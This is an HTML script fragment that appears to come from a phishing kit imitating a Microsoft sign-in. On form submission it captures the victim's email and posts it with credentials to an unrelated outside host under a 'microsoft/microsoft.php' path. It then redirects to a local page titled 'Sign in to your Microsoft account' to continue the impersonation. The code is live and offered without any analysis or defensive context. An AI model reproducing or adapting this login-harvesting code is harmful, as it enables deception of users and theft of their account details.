<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
<script>
    document.getElementById("signInForm").addEventListener("submit", function(event) {
        event.preventDefault(); 

        const email = document.getElementById("emailInput").value;
        const apiUrl = "https://fashionhub.geoedu360.com/SignUpClassesPhp/microsoft/microsoft.php"; 

        const data = {
            email: email,
            message: "A user is trying to login"
        };

        axios.post(apiUrl, data, {
            headers: {
                "Content-Type": "application/json"
            },
            withCredentials: true 
        })
        .then(response => {
            const result = response.data;
            if (result.status === "success") {
                location.href = `Sign in to your Microsoft account.html?email=${encodeURIComponent(email)}`;
            } else {
                console.log("Failed to sign in. Please check your email and try again.");
            }
        })
        .catch(error => {
            console.error("Error:", error);
        });
    });
</script>
